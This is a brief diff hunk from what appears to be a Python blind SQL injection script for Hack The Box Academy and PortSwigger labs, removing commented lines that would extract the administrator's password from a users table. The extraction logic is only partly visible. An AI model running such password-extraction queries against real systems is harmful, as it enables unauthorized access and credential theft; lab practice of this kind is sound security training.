@@ -44,11 +44,6 @@ def dump_string(q, length):
         var += chr(low)
     return var
 
-# PortSwigger 
-#length=dump_length("password")
-#print(length)
-#print(dump_string("SELECT password FROM users WHERE username = 'administrator'", length))
-
 func = int(input("""HTB_ACADEMY_ORACLE
 (1) Get Length
 (2) Get Name
